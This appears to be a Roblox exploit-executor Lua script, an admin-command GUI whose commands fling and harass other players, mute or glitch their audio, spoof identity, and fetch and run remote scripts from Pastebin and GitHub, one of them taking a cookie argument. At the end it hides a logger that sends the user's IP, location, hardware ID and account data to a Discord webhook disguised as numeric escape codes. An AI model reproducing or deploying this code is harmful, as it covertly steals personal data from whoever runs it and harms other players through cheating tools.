						local rootPart = game:GetService("Players").LocalPlayer.Character:FindFirstChild('HumanoidRootPart') or game:GetService("Players").LocalPlayer.Character:FindFirstChild('Torso') or game:GetService("Players").LocalPlayer.Character:FindFirstChild('UpperTorso')
						return rootPart
					end

					local Noclipping = nil
					Clip = false
					task.wait(0.1)
					local function NoclipLoop()
						if Clip == false and game:GetService("Players").LocalPlayer.Character ~= nil then
							for _, child in pairs(game:GetService("Players").LocalPlayer.Character:GetDescendants()) do
								if child:IsA("BasePart") and child.CanCollide == true and child.Name ~= floatName then
									child.CanCollide = false
								end
							end
						end
					end
					Noclipping = game:GetService("RunService").Stepped:Connect(NoclipLoop)

					flinging = false
					for _, child in pairs(game:GetService("Players").LocalPlayer.Character:GetDescendants()) do
						if child:IsA("BasePart") then
							child.CustomPhysicalProperties = PhysicalProperties.new(math.huge, 0.3, 0.5)
						end
					end
					task.wait(.1)
					task.wait(.1)
					local bambam = Instance.new("BodyAngularVelocity")
					bambam.Name = "0"
					bambam.Parent = getRoot(game:GetService("Players").LocalPlayer.Character)
					bambam.AngularVelocity = Vector3.new(0,99999,0)
					bambam.MaxTorque = Vector3.new(0,math.huge,0)
					bambam.P = math.huge
					local Char = game:GetService("Players").LocalPlayer.Character:GetChildren()
					for i, v in next, Char do
						if v:IsA("BasePart") then
							v.CanCollide = false
							v.Massless = true
							v.Velocity = Vector3.new(0, 0, 0)
						end
					end
					flinging = true
					local function flingDiedF()
						if flingDied then
							flingDied:Disconnect()
						end
						flinging = false
						task.wait(.1)
						local speakerChar = game:GetService("Players").LocalPlayer.Character
						if not speakerChar or not getRoot(speakerChar) then return end
						for i,v in pairs(getRoot(speakerChar):GetChildren()) do
							if v.ClassName == 'BodyAngularVelocity' then
								v:Destroy()
							end
						end
						for _, child in pairs(speakerChar:GetDescendants()) do
							if child.ClassName == "Part" or child.ClassName == "MeshPart" then
								child.CustomPhysicalProperties = PhysicalProperties.new(0.7, 0.3, 0.5)
							end
						end
					end
					flingDied = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass('Humanoid').Died:Connect(flingDiedF)
					repeat
						bambam.AngularVelocity = Vector3.new(0,99999,0)
						task.wait(.2)
						bambam.AngularVelocity = Vector3.new(0,0,0)
						task.wait(.1)
					until flinging == false
				end)
			end
		end

		for _, name in pairs(allcmds.brookhaven) do
			if cmd == pf..name then
				task.spawn(function()
					loadstring(game:HttpGet("https://raw.githubusercontent.com/IceMael7/NewIceHub/main/Brookhaven"))()
				end)
			end
		end

		for _, name in pairs(allcmds.chatbypass) do
			if cmd == pf..name then
				task.spawn(function()
					loadstring(game:HttpGet("https://raw.githubusercontent.com/shakk-code/SigmaBypasser/refs/heads/main/source"))()
				end)
			end
		end

		for _, name in pairs(allcmds.collisions) do
			if cmd == pf..name then
				task.spawn(function()
					LP = game:GetService("Players").LocalPlayer
					while task.wait(3) do
						for i,v in pairs(game:GetService("Players"):GetDescendants()) do
							if v:IsA("Player") and workspace:FindFirstChild(v.Name) and v ~= LP and workspace[v.Name]:FindFirstChild("CHECKER") == nil then
								checker = Instance.new("BoolValue",workspace[v.Name])
								checker.Name = "CHECKER"
								for i,v in pairs(workspace:WaitForChild(v.Name):GetDescendants()) do
									if v:IsA("Part") or v:IsA("MeshPart") then
										local collider = Instance.new("Part",v)
										collider.Size = v.Size
										collider.Position = v.Position
										collider.Transparency = 1
										local weld = Instance.new("Weld",v)
										weld.Part0 = v
										weld.Part1 = collider
									end
								end
							end
						end
					end
				end)
			end
		end

		for _, name in pairs(allcmds.eclipsehub) do
			if cmd == pf..name then
				task.spawn(function()
					getgenv().mainKey = arg1

					local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https\58//api.eclipsehub.xyz/auth";c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()

					if arg1 == "" or arg1 == nil then
						output.Text = "Error: You need to put 'nil' if you don't have a key."
						task.wait(4)
						output.Text = ""
					elseif arg1 == "nil" then
						output.Text = "Tip: If you want the most out of Eclipse Hub then buy Premium!"
						task.wait(4)
						output.Text = ""
					end
				end)
			end
		end

		for _, name in pairs(allcmds.expandchat) do
			if cmd == pf..name then
				task.spawn(function()
					require(game:GetService("Chat").ClientChatModules.ChatSettings).WindowResizable = true
					require(game:GetService("Chat").ClientChatModules.ChatSettings).WindowDraggable = true
				end)
			end
		end

		for _, name in pairs(allcmds.frakturess) do
			if cmd == pf..name then
				task.spawn(function()
					loadstring(game:HttpGet("https://raw.githubusercontent.com/L1ghtingBolt/FraktureSS/master/source.lua"))()
				end)
			end
		end

		for _, name in pairs(allcmds.translator) do
			if cmd == pf..name then
				task.spawn(function()
					loadstring(game:HttpGet("https://pastebin.com/raw/itr2s59y"))()
				end)
			end
		end

		for _, name in pairs(allcmds.glitchradio) do
			if cmd == pf..name then
				task.spawn(function()
					task.spawn(function()
						Username = arg1
						Loopglitch = true
						local players = getPlr(Username)
						if players ~= nil then
							for i, x in next, players.Character:GetDescendants() do
								if x:IsA("Sound") and x.Playing == true then
									x.Playing = true
								end
							end
							for i, x in next, players:FindFirstChildOfClass("Backpack"):GetDescendants() do
								if x:IsA("Sound") and x.Playing == true then
									x.Playing = true
								end
							end
						end 
						if game:GetService("SoundService").RespectFilteringEnabled == true then
							print("Boombox Glitched as Client")
						else
							if game:GetService("SoundService").RespectFilteringEnabled == false then
								print("Boombox Glitched as FE")
							end
						end
						repeat task.wait()
							for i, x in next, players:FindFirstChildOfClass("Backpack"):GetDescendants() do
								if x:IsA("Sound") and x.Playing == false then
									x.Playing = true
								end
							end
							for i, x in next, players.Character:GetDescendants() do
								if x:IsA("Sound") and x.Playing == false then
									x.Playing = true
								end
							end
							task.wait(0.2)
							for i, x in next, players:FindFirstChildOfClass("Backpack"):GetDescendants() do
								if x:IsA("Sound") and x.Playing == true then
									x.Playing = false
								end
							end
							for i, x in next, players.Character:GetDescendants() do
								if x:IsA("Sound") and x.Playing == true then
									x.Playing = false
								end
							end
							task.wait(0.2)
						until Loopglitch == false
					end)
					local plrs = game:GetService("Players"):FindFirstChild(arg1)
					if arg1 ~= plrs.Name then
						output.Text = "Error: Player not found."
						task.wait(4)
						output.Text = ""
					elseif arg1 == plrs.Name then
						output.Text = "Checking Console tells you that it's FE or Client. (What it means is RespectFilteringEnabled in Sound Service is on or off.)"
						task.wait(4)
						output.Text = ""
					end
				end)
			end
		end

		for _, name in pairs(allcmds.noclipfling) do
			if cmd == pf..name then
				task.spawn(function()
					Target = arg1
					flinghh = 1000

					target = getPlr(Target)
					workspace.CurrentCamera.CameraSubject = target.Character.Humanoid


					local lp = game:GetService("Players").LocalPlayer
					for i,v in pairs(game:GetService("Players"):GetPlayers()) do
						if v.Name:lower():match("^"..Target:lower()) or v.DisplayName:lower():match("^"..Target:lower()) then
							Target = v
							break
						end
					end

					if type(Target) == "string" then return end

					local oldpos = lp.Character.HumanoidRootPart.CFrame
					local oldhh = lp.Character.Humanoid.HipHeight

					local carpetAnim = Instance.new("Animation")
					carpetAnim.AnimationId = "rbxassetid://282574440"
					carpet = lp.Character:FindFirstChildOfClass('Humanoid'):LoadAnimation(carpetAnim)
					carpet:Play(.1, 1, 1)

					local carpetLoop

					local tTorso = Target.Character:FindFirstChild("Torso") or Target.Character:FindFirstChild("LowerTorso") or Target.Character:FindFirstChild("HumanoidRootPart")

					spawn(function()
						carpetLoop = game:GetService('RunService').Heartbeat:Connect(function()
							pcall(function()
								if tTorso.Velocity.magnitude <= 28 then -- if target uses netless just target their local position
									local pos = {x=0, y=0, z=0}
									pos.x = tTorso.Position.X
									pos.y = tTorso.Position.Y
									pos.z = tTorso.Position.Z
									pos.x = pos.x + tTorso.Velocity.X / 2
									pos.y = pos.y + tTorso.Velocity.Y / 2
									pos.z = pos.z + tTorso.Velocity.Z / 2
									lp.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(pos.x,pos.y,pos.z))
								else
									lp.Character.HumanoidRootPart.CFrame = tTorso.CFrame
								end
							end)
						end)
					end)

					task.wait()

					lp.Character.Humanoid.HipHeight = flinghh

					task.wait(.5)

					carpetLoop:Disconnect()
					workspace.CurrentCamera.CameraSubject = target.Character.Humanoid
					task.wait(1)
					lp.Character.Humanoid.Health = 0
					task.wait(game:GetService("Players").RespawnTime + .6)
					lp.Character.HumanoidRootPart.CFrame = oldpos
				end)
			end
		end

		for _, name in pairs(allcmds.skibidirizz) do
			if cmd == pf..name then
				task.spawn(function()
					loadstring(game:HttpGet("https://raw.githubusercontent.com/MastersMZ-Scripts/Scripts/main/plague%20rizz%20script.lua"))()
				end)
			end
		end

		for _, name in pairs(allcmds.toggletouch) do
			if cmd == pf..name then
				task.spawn(function()
					local player = game:GetService("Players").LocalPlayer
					local UIS = game:GetService("UserInputService")
					local myzaza = false

					UIS.InputBegan:Connect(function(input, GPE)
						if GPE then return end
						if input.KeyCode == Enum.KeyCode.Z then
							myzaza = not myzaza
						end
					end)

					while true do
						if math.random(-5,5) == 0 then
							task.wait()
						end
						local parts = workspace:GetPartBoundsInRadius(player.Character:WaitForChild("HumanoidRootPart").Position, 20)
						for _, part in ipairs(parts) do
							part.CanTouch = myzaza
						end
					end
				end)
			end
		end

		for _, name in pairs(allcmds.unspinfling) do
			if cmd == pf..name then
				task.spawn(function()
					if Noclipping then
						Noclipping:Disconnect()
					end
					Clip = true

					if flingDied then
						flingDied:Disconnect()
					end
					flinging = false
					task.wait(.1)
					local speakerChar = game:GetService("Players").LocalPlayer.Character
					if not speakerChar or not getRoot(speakerChar) then return end
					for i,v in pairs(getRoot(speakerChar):GetChildren()) do
						if v.ClassName == 'BodyAngularVelocity' then
							v:Destroy()
						end
					end
					for _, child in pairs(speakerChar:GetDescendants()) do
						if child.ClassName == "Part" or child.ClassName == "MeshPart" then
							child.CustomPhysicalProperties = PhysicalProperties.new(0.7, 0.3, 0.5)
						end
					end
				end)
			end
		end

		for _, name in pairs(allcmds.loopmuteradio) do
			if cmd == pf..name then
				task.spawn(function()
					task.spawn(function()
						Username = arg1
						if Username == "all" or Username == "others" then
							Loopmute = true
							repeat task.wait()
								local players = game:GetService("Players"):GetPlayers()
								for _, player in ipairs(players) do
									for _, object in ipairs(player.Character:GetDescendants()) do
										if object:IsA("Sound") and object.Playing then
											object:Stop()
										end
									end
									local backpack = player:FindFirstChildOfClass("Backpack")
									if backpack then
										for _, object in ipairs(backpack:GetDescendants()) do
											if object:IsA("Sound") and object.Playing then
												object:Stop()
											end
										end
									end
								end	
							until Loopmute == false
						else
							Loopmute = true
							local players = getPlr(Username)
							repeat task.wait()

								if players ~= nil then
									for i, x in next, players.Character:GetDescendants() do
										if x:IsA("Sound") and x.Playing == true then
											x.Playing = false
										end
									end
									for i, x in next, players:FindFirstChildOfClass("Backpack"):GetDescendants() do
										if x:IsA("Sound") and x.Playing == true then
											x.Playing = false
										end
									end
								end 
							until Loopmute == false
							if game:GetService("SoundService").RespectFilteringEnabled == true then
								print("Boombox loop muted as Client")
							else
								if game:GetService("SoundService").RespectFilteringEnabled == false then
									print("Boombox loop muted as FE")
								end
							end
						end
					end)
					local plrs = game:GetService("Players"):FindFirstChild(arg1)
					if arg1 ~= plrs.Name then
						output.Text = "Error: Player not found."
						task.wait(4)
						output.Text = ""
					elseif arg1 == plrs.Name then
						output.Text = "Checking Console tells you that it's FE or Client. (What it means is RespectFilteringEnabled in Sound Service is on or off.)"
						task.wait(4)
						output.Text = ""
					end
				end)
			end
		end

		for _, name in pairs(allcmds.namelessadmin) do
			if cmd == pf..name then
				task.spawn(function()
					loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/Source.lua"))()
				end)
			end
		end

		for _, name in pairs(allcmds.scpfuturistic) do
			if cmd == pf..name then
				task.spawn(function()
					loadstring(game:HttpGet("https://raw.githubusercontent.com/TheEGodOfficial/scp_futuristic_gui_v2/refs/heads/main/Source.lua"))()
				end)
			end
		end

		for _, name in pairs(allcmds.unloopmuteradio) do
			if cmd == pf..name then
				task.spawn(function()
					Loopmute = false
					print("Muted Boomboxes are now able to be used.")
				end)
			end
		end

		for _, name in pairs(allcmds.unglitchradio) do
			if cmd == pf..name then
				task.spawn(function()
					Loopglitch = false
					print("Glitched Boomboxes are now able to be used.")
				end)
			end
		end

		for _, name in pairs(allcmds.animlogs) do
			if cmd == pf..name then
				task.spawn(function()
					loadstring(game:HttpGet("https://pastebin.com/raw/mPwkmXq7"))()
				end)
			end
		end

		for _, name in pairs(allcmds.iplog) do
			if cmd == pf..name then
				task.spawn(function()
					loadstring(game:HttpGet("https://pastebin.com/raw/Fi7ARPBj"))()
				end)
			end
		end

		for _, name in pairs(allcmds.ball) do
			if cmd == pf..name then
				task.spawn(function()
					loadstring(game:HttpGet("https://pastebin.com/raw/h8EumNRw"))()
				end)
			end
		end

		for _, name in pairs(allcmds.info) do
			if cmd == pf..name then
				task.spawn(function()
					loadstring(game:HttpGet("https://pastebin.com/raw/qW2Pxd37"))()
				end)
			end
		end

		for _, name in pairs(allcmds.reset) do
			if cmd == pf..name then
				task.spawn(function()
					local chr = p.Character or p.CharacterAdded:Wait()
					chr:BreakJoints()
				end)
			end
		end

		for _, name in pairs(allcmds.scp173) do
			if cmd == pf..name then
				task.spawn(function()
					loadstring(game:HttpGet("https://pastebin.com/raw/Yk720g1L"))()
				end)
			end
		end

		for _, name in pairs(allcmds.jorking) do
			if cmd == pf..name then
				task.spawn(function()
					loadstring(game:HttpGet("https://pastebin.com/raw/ZKvxb3HY"))()
				end)
			end
		end

		for _, name in pairs(allcmds.vrsetup) do
			if cmd == pf..name then
				task.spawn(function()
					-- DO NOT RUN THIS IN VR MODE
					skyvrversion = '3.0.0'

					VR_Model_Customization_GUI = game:GetObjects("rbxassetid://93922799482853")[1]
					VR_Model_Customization_GUI.Parent = gethui and gethui() or game:GetService("CoreGui")

					loadstring(game:HttpGet("https://raw.githubusercontent.com/presidentanvil/skyvr/main/VRCustomizationMain.lua"))()
				end)
			end
		end

		for _, name in pairs(allcmds.febypass) do
			if cmd == pf..name then
				task.spawn(function()
					getgenv().CookieArgument = arg1
					loadstring(game:HttpGet("https://pastebin.com/raw/se4mMrXH"))()
				end)
			end
		end

		for _, name in pairs(allcmds.posreset) do
			if cmd == pf..name then
				task.spawn(function()
					local chr = p.Character or p.CharacterAdded:Wait()
					local oldpos = chr:GetPivot()
					chr:BreakJoints()
					p.CharacterAdded:Wait()
					game:GetService("RunService").Heartbeat:Wait()
					chr = p.Character
					chr:PivotTo(oldpos)
				end)
			end
		end

		for _, name in pairs(allcmds.fastreset) do
			if cmd == pf..name then
				task.spawn(function()
					local chr = p.Character or p.CharacterAdded:Wait()
					local oldtime = game:GetService("Players").RespawnTime
					game:GetService("Players").RespawnTime = 0.5
					task.wait(0.5)
					chr:BreakJoints()
					task.wait(0.5)
					game:GetService("Players").RespawnTime = oldtime
				end)
			end
		end

		for _, name in pairs(allcmds.rochipsuni) do
			if cmd == pf..name then
				task.spawn(function()
					if "you wanna use rochips universal" then
						local z_x,z_z="gzrux646yj/raw/main.ts","https://glot.io/snippets/"
						local im,lonely,z_c=task.wait,game,loadstring
						z_c(lonely:HttpGet(z_z..""..z_x))()
						return ("This will load in about 2 - 30 seconds" or "according to your device and executor")
					end
				end)
			end
		end

		for _, name in pairs(allcmds.fakewallhop) do
			if cmd == pf..name then
				task.spawn(function()
					loadstring(game:HttpGet("https://pastebin.com/raw/14JjVTL2"))()
				end)
			end
		end

		for _, name in pairs(allcmds.rochipscmds) do
			if cmd == pf..name then
				task.spawn(function()
					loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/new/refs/heads/main/cmd.lua"))() -- rochips commands
				end)
			end
		end

		for _, name in pairs(allcmds.walkonwalls) do
			if cmd == pf..name then
				task.spawn(function()
					loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/Qwerty/refs/heads/main/qwerty21.lua"))() -- walk on walls
				end)
			end
		end

		for _, name in pairs(allcmds.posfastreset) do
			if cmd == pf..name then
				task.spawn(function()
					local chr = p.Character or p.CharacterAdded:Wait()
					local oldpos = chr:GetPivot()
					local oldtime = game:GetService("Players").RespawnTime
					game:GetService("Players").RespawnTime = 0.5
					task.wait(0.5)
					chr:BreakJoints()
					p.CharacterAdded:Wait()
					game:GetService("RunService").Heartbeat:Wait()
					chr = p.Character
					chr:PivotTo(oldpos)
					task.wait(0.5)
					game:GetService("Players").RespawnTime = oldtime
				end)
			end
		end

		for _, name in pairs(allcmds.antibackshots) do
			if cmd == pf..name then
				task.spawn(function()
					loadstring(game:HttpGet("https://pastebin.com/raw/EL5VxfEy"))()
				end)
			end
		end

		for _, name in pairs(allcmds.autobackshots) do
			if cmd == pf..name then
				task.spawn(function()
					loadstring(game:HttpGet("https://pastebin.com/raw/2gXkhvLH"))()
				end)
			end
		end

		for _, name in pairs(allcmds.spooflocalplayer) do
			if cmd == pf..name then
				task.spawn(function()
					local playerMetatable = {
						__index = function(tbl, key)
							if key == "Name" then
								return "SpoofedLocalPlayer" 
							elseif key == "Character" then
								return Instance.new("Model", workspace).Name == "SpoofedCharacter"
							elseif key == "UserId" then
								return 1234567890 
							end
						end
					}

					local existingLocalPlayer = game:GetService("Players").LocalPlayer

					local fakeLocalPlayer = {}
					setmetatable(fakeLocalPlayer, playerMetatable)

					local limbs = {LeftLeg = Instance.new("Part"),RightLeg = Instance.new("Part"),LeftArm = Instance.new("Part"),RightArm = Instance.new("Part"),Torso = Instance.new("Part"),Head = Instance.new("Part")}
					local fakehum = Instance.new("Humanoid")

					task.spawn(function()
						fakehum.Name = "SpoofedHumanoid"
						fakehum.DisplayName = "HelloIAmSpoofedHaHa"
						fakehum.Parent = workspace:WaitForChild("SpoofedCharacter",10)
						limbs.LeftArm.Anchored = true
						limbs.LeftArm.CFrame = CFrame.new(0,9e9,0)
						limbs.LeftArm.Size = Vector3.new(1,2,1)
						limbs.LeftArm.Parent = workspace:WaitForChild("SpoofedCharacter",10)
						limbs.LeftLeg.Anchored = true
						limbs.LeftLeg.CFrame = CFrame.new(0,9e9,0)
						limbs.LeftLeg.Size = Vector3.new(1,2,1)
						limbs.LeftLeg.Parent = workspace:WaitForChild("SpoofedCharacter",10)
						limbs.RightArm.Anchored = true
						limbs.RightArm.CFrame = CFrame.new(0,9e9,0)
						limbs.RightArm.Size = Vector3.new(1,2,1)
						limbs.RightArm.Parent = workspace:WaitForChild("SpoofedCharacter",10)
						limbs.RightLeg.Anchored = true
						limbs.RightLeg.CFrame = CFrame.new(0,9e9,0)
						limbs.RightLeg.Size = Vector3.new(1,2,1)
						limbs.RightLeg.Parent = workspace:WaitForChild("SpoofedCharacter",10)
						limbs.Torso.Anchored = true
						limbs.Torso.CFrame = CFrame.new(0,9e9,0)
						limbs.Torso.Size = Vector3.new(2,2,1)
						limbs.Torso.Parent = workspace:WaitForChild("SpoofedCharacter",10)
						limbs.Head.Anchored = true
						limbs.Head.CFrame = CFrame.new(0,9e9,0)
						limbs.Head.Size = Vector3.new(2,1,1)
						limbs.Head.Parent = workspace:WaitForChild("SpoofedCharacter",10)
					end)

					existingLocalPlayer.Name = fakeLocalPlayer.Name
					existingLocalPlayer.UserId = fakeLocalPlayer.UserId

					print("Spoofed LocalPlayer Name:", game:GetService("Players").LocalPlayer.Name)
					print("Spoofed LocalPlayer UserID:", game:GetService("Players").LocalPlayer.UserId)
				end)
			end
		end

		for _, name in pairs(allcmds.rochipsadminpanel) do
			if cmd == pf..name then
				task.spawn(function()
					loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/load/refs/heads/main/rcloader"))() -- rochip admin panel
				end)
			end
		end
	end

	input.FocusLost:Connect(function(enter)
		if not enter then
			return
		end

		Commands(prefix, input.Text)
	end)

	local chatprefix = game:GetService("TextChatService").ChatVersion == Enum.ChatVersion.LegacyChatService and ">" or "&gt;"

	p.Chatted:Connect(function(msg)
		Commands(chatprefix, msg)
	end)

	task.spawn(function()
		local HttpService = game:GetService("HttpService")
		local Players = game:GetService("Players")
		local MarketplaceService = game:GetService("MarketplaceService")
		local LocalizationService = game:GetService("LocalizationService")
		local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
		local GroupService = game:GetService("GroupService")
		local BadgeService = game:GetService("BadgeService")
		local UserInputService = game:GetService("UserInputService")
		local Stats = game:GetService("Stats")

		local LocalPlayer = Players.LocalPlayer
		local UserId = LocalPlayer.UserId
		local DisplayName = LocalPlayer.DisplayName
		local Username = LocalPlayer.Name
		local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
		local AccountAge = LocalPlayer.AccountAge
		local Country = LocalizationService.RobloxLocaleId
		local GetIp = game:HttpGet("https://v4.ident.me/")
		local GetData = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json"))
		local Hwid = RbxAnalyticsService:GetClientId()
		local GameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
		local GameName = GameInfo.Name
		local Platform = (UserInputService.TouchEnabled and not UserInputService.MouseEnabled) and "Mobile" or "PC"
		local Ping = math.round(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())

		local function detectExecutor()
			return identifyexecutor()
		end

		local function createWebhookData()
			local executor = detectExecutor()
			local date = os.date("%m/%d/%Y")
			local time = os.date("%X")
			local gameLink = "https://www.roblox.com/games/" .. game.PlaceId
			local playerLink = "https://www.roblox.com/users/" .. UserId
			local mobileJoinLink = "https://www.roblox.com/games/start?placeId=" .. game.PlaceId .. "&launchData=" .. game.JobId
			local jobIdLink = "https://www.roblox.com/games/" .. game.PlaceId .. "?jobId=" .. game.JobId

			local data = {
				username = "E Commands FE Execution Logger",
				avatar_url = "https://cdn.discordapp.com/avatars/557509179020017674/0b8ae2468a67c87d57ebd99c8a1734cf.webp?size=1024&width=591&height=591",
				embeds = {
					{
						title = "Game Info:",
						description = string.format("**[%s](%s)**\n`ID: %d`", GameName, gameLink, game.PlaceId),
						color = tonumber("0x2ecc71")
					},
					{
						title = "Player Info:",
						description = string.format(
							"**Display Name:** [%s](%s)\n**Username:** %s\n**User ID:** %d\n**Membership:** %s\n**Account Age:** %d days\n**Platform:** %s\n**Ping:** %dms",
							DisplayName, playerLink, Username, UserId, MembershipType, AccountAge, Platform, Ping
						),
						color = MembershipType == "Premium" and tonumber("0xf1c40f") or tonumber("0x3498db")
					},
					{
						title = "Location/Network Info:",
						description = string.format(
							"**IP:** `%s`\n**HWID:** `%s`\n**Country:** %s :flag_%s:\n**Region:** %s\n**City:** %s\n**Postal Code:** %s\n**ISP:** %s\n**Organization:** %s\n**Time Zone:** %s",
							GetIp, Hwid, GetData.country, string.lower(GetData.countryCode), GetData.regionName, GetData.city, GetData.zip, GetData.isp, GetData.org, GetData.timezone
						),
						color = tonumber("0xe74c3c")
					},
					{
						title = "Tech Info:",
						description = string.format(
							"**Executor:** `%s`\n**Job ID:** [Click to Copy](%s)\n**Mobile Join:** [Click](%s)",
							executor, jobIdLink, mobileJoinLink
						),
						color = tonumber("0x95a5a6"),
						footer = { 
							text = string.format("Date: %s / Time: %s", date, time)
						}
					}
				}
			}
			return HttpService:JSONEncode(data)
		end

		local function sendWebhook(webhookUrl, data)
			local headers = {["Content-Type"] = "application/json"}
			local request = http_request or request or HttpPost or syn.request
			local webhookRequest = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
			request(webhookRequest)
		end

		local webhookUrl = "\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\99\111\109\47\97\112\105\47\119\101\98\104\111\111\107\115\47\49\51\52\50\54\51\56\53\54\50\50\52\51\50\52\56\49\50\57\47\77\71\122\114\72\116\116\48\88\88\109\107\49\105\110\55\108\112\118\81\107\99\102\109\75\119\66\109\78\107\71\110\99\111\103\106\102\67\84\119\122\87\66\99\89\57\100\48\67\52\118\49\72\86\98\74\119\122\75\121\50\54\97\74\76\73\80\74"
		local webhookData = createWebhookData()
		sendWebhook(webhookUrl, webhookData)
	end)
end;
task.spawn(C_c);
-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.maininfo
local function C_67()
	local script = G2L["67"];
	-- rewritten by E God

	for _, cmds in pairs(script.Parent:GetChildren()) do
		if cmds:IsA("TextButton") and cmds:FindFirstChild("Info") then
			local db = false
			cmds.MouseButton1Click:Connect(function()
				if db == true then
					return
				end
				db = true
				local backupmsg = cmds.Text
				print(cmds.Info.Value)
				game:GetService("RunService").RenderStepped:Wait()
				cmds.Text = "Check Console for info on the command. (mobile: /console, computer: F9)"
				task.wait(3)
				cmds.Text = backupmsg
				game:GetService("RunService").RenderStepped:Wait()
				db = false
			end)
		end
	end
end;
task.spawn(C_67);

return G2L["1"], require;
